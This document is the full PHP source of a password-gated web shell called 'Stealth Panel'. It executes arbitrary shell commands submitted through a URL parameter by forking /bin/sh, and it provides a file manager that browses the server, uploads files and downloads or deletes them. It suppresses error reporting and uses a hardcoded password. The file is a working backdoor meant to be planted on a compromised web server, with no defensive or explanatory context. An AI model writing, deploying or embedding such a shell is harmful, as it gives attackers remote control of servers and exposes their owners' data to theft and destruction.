<?php
error_reporting(0);
session_start();

$password = "wiredmouseis";  

// Password Check
if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass']) && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
    } else {
        die('<html><head><title>Access</title><style>body{background:#000;color:#0f0;font-family:Consolas;text-align:center;padding-top:80px;}</style></head><body>
        <h2>Enter Password</h2>
        <form method="post"><input type="password" name="pass" style="background:#111;border:1px solid #0f0;color:#0f0;padding:12px;width:280px;" autofocus></form>
        </body></html>');
    }
}

// Current Directory
$dir = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if (!is_dir($dir)) $dir = getcwd();
chdir($dir);

$cmd = $_GET['c'] ?? '';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Stealth Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        body { background:#0a0a0a; color:#e0e0e0; font-family:Consolas, monospace; margin:0; padding:0; }
        .header { background:#111; padding:15px; display:flex; justify-content:space-between; align-items:center; border-bottom:2px solid #0f0; }
        .path { color:#0f0; word-break:break-all; }
        table { width:100%; border-collapse:collapse; }
        th, td { padding:10px 12px; border-bottom:1px solid #222; }
        tr:hover { background:#1a1a1a; }
        .folder { color:#4fc3f7; }
        .file { color:#81c784; }
        input[type=text] { width:75%; padding:12px; background:#111; border:1px solid #0f0; color:#0f0; }
        button { padding:12px 20px; background:#111; border:1px solid #0f0; color:#0f0; cursor:pointer; }
        .output { background:#000; padding:15px; margin:10px 0; white-space:pre-wrap; border:1px solid #222; }
    </style>
</head>
<body>

<div class="header">
    <h2><i class="fas fa-server"></i> Stealth Panel</h2>
    <a href="?logout=1" style="color:#f66;">Logout</a>
</div>

<div style="padding:15px;">

    <!-- Command Shell -->
    <h3>⚡ Command Shell</h3>
    <form method="GET">
        <input type="text" name="c" placeholder="id || whoami || ls -la || uname -a" autofocus>
        <button type="submit">Run</button>
    </form>

    <?php if($cmd): ?>
    <div class="output">
        <b>Command:</b> <?=htmlspecialchars($cmd)?><br><br>
        <?php
        $out = '/tmp/out_'.rand(10000,99999).'.txt';
        if(function_exists('pcntl_fork') && function_exists('pcntl_exec')){
            $pid = pcntl_fork();
            if($pid == 0){
                pcntl_exec('/bin/sh', ['-c', $cmd . " > $out 2>&1"]);
                exit();
            }
            sleep(2);
        }
        $result = file_exists($out) ? file_get_contents($out) : '';
        @unlink($out);

        echo htmlspecialchars($result ?: "No output");
        ?>
    </div>
    <?php endif; ?>

    <!-- File Manager -->
    <h3>📁 File Manager - <?=htmlspecialchars(basename($dir))?></h3>
    <div class="path"><b>Path:</b> <?=htmlspecialchars($dir)?></div>

    <!-- Upload -->
    <form method="post" enctype="multipart/form-data" style="margin:15px 0;">
        <input type="file" name="ufile">
        <button type="submit">Upload</button>
    </form>

    <?php
    // Upload
    if(isset($_FILES['ufile'])){
        $target = $dir . '/' . basename($_FILES['ufile']['name']);
        if(move_uploaded_file($_FILES['ufile']['tmp_name'], $target)){
            echo "<p style='color:lime;'>✓ Uploaded Successfully</p>";
        } else {
            echo "<p style='color:red;'>✗ Upload Failed</p>";
        }
    }

    // Delete
    if(isset($_GET['del'])){
        $delpath = $dir.'/'.$_GET['del'];
        if(is_file($delpath)) unlink($delpath);
        elseif(is_dir($delpath)) @rmdir($delpath);
        header("Location: ?d=".urlencode($dir));
    }
    ?>

    <table>
        <tr><th>Name</th><th>Type</th><th>Size</th><th>Action</th></tr>
        <?php
        $files = scandir($dir);
        foreach($files as $f){
            if($f == "." || $f == "..") continue;
            $full = $dir.'/'.$f;
            $isDir = is_dir($full);
            echo "<tr>";
            echo "<td>";
            if($isDir){
                echo '<a href="?d='.urlencode($full).'" class="folder"><i class="fas fa-folder"></i> '.$f.'</a>';
            } else {
                echo '<a href="?d='.urlencode($dir).'&download='.urlencode($f).'" class="file"><i class="fas fa-file"></i> '.$f.'</a>';
            }
            echo "</td>";
            echo "<td>".($isDir ? 'Folder' : pathinfo($f,PATHINFO_EXTENSION))."</td>";
            echo "<td>".($isDir ? '-' : round(filesize($full)/1024,2).' KB')."</td>";
            echo "<td>".(!$isDir ? '<a href="?del='.urlencode($f).'&d='.urlencode($dir).'" style="color:#f66;">Delete</a>' : '')."</td>";
            echo "</tr>";
        }
        ?>
    </table>
</div>

<?php
// Download
if(isset($_GET['download'])){
    $file = $dir.'/'.$_GET['download'];
    if(file_exists($file)){
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
}

// Logout
if(isset($_GET['logout'])){ session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); }
?>
</body>
</html>
